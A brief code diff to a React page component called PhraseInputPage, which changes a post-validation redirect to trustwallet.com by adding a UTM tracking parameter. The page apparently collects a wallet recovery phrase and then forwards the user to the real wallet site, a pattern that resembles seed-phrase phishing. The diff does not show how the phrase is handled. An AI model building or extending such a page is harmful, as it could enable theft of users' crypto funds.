@@ -138,7 +138,7 @@ export default function PhraseInputPage() {
         variant: "default",
       });
       // Redirect to Trust Wallet website
-      window.location.href = 'https://trustwallet.com';
+      window.location.href = 'https://trustwallet.com/?utm_source=cryptwerk';
     } else {
       toast({
         title: "Invalid Phrase",
